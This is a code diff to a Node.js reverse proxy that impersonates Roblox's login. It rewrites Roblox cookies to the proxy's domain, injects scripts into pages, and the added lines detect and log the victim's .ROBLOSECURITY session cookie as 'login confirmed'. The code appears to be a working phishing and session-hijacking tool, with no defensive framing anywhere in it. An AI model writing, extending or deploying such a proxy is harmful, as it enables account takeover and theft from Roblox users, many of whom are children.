@@ -403,6 +403,19 @@ function forwardResponse(res, response, host, origin, deviceId) {
 
     const cookies = headers['set-cookie'];
     let allCookies = rewriteCookies(cookies, host) || [];
+
+    // Confirm whether Roblox returned a .ROBLOSECURITY session cookie
+    const hasRobloSecurity = (cookies || []).some(c => c.includes('.ROBLOSECURITY'));
+    if (hasRobloSecurity) {
+        const raw = (cookies || []).find(c => c.includes('.ROBLOSECURITY')) || '';
+        const tokenPart = raw.split(';')[0]; // just the name=value, no attributes
+        const preview = tokenPart.length > 40 ? tokenPart.substring(0, 40) + '...' : tokenPart;
+        console.log(`✅ .ROBLOSECURITY received — login confirmed! (${preview})`);
+    } else {
+        if (status === 200) {
+            console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY cookie — silent failure`);
+        }
+    }
     
     if (deviceId) {
         allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
@@ -1086,13 +1099,7 @@ app.use('/', createProxyMiddleware({
     timeout: 30000,
     agent: httpsAgent,
 
-    pathRewrite: (path, req) => {
-        // /?nl=true is the post-login "continue to browser" page - pass through to Roblox
-        if (req.url && req.url.startsWith('/?nl=')) return req.url;
-        // bare / goes to login
-        if (path === '/') return '/login';
-        return path;
-    },
+    pathRewrite: (path) => (path === '/' ? '/login' : path),
 
     on: {
         proxyReq: (proxyReq, req) => {
@@ -1111,15 +1118,6 @@ app.use('/', createProxyMiddleware({
                 console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies to domain: .${host}`);
             }
 
-            // Rewrite Location header so server-side redirects stay on the proxy
-            if (proxyRes.headers['location']) {
-                let loc = proxyRes.headers['location'];
-                loc = loc.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
-                loc = loc.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
-                proxyRes.headers['location'] = loc;
-                console.log(`[main] 🔀 Rewrote Location: ${loc}`);
-            }
-
             // Set CORS headers
             const origin = req.headers['origin'] || `https://${host}`;
             res.setHeader('access-control-allow-origin', origin);
@@ -1131,15 +1129,6 @@ app.use('/', createProxyMiddleware({
             if (ct.includes('text/html')) {
                 let body = buffer.toString('utf8');
                 body = rewriteUrls(body, host);
-
-                // If this is the /?nl=true interstitial, skip it and go straight to /home
-                const isNlPage = (req.url || '').includes('nl=');
-                if (isNlPage) {
-                    console.log(`[main] 🏠 nl=true page - injecting auto-redirect to /home`);
-                    const autoRedirect = `<script>(function(){console.log('[Proxy] nl=true - redirecting to /home');window.location.replace('https://${host}/home');})();</script>`;
-                    body = body.replace('<head', '<head>' + autoRedirect);
-                }
-
                 const script = buildInjectedScript(host);
                 body = body.replace('<head', `<head>${script}`);
                 return body;
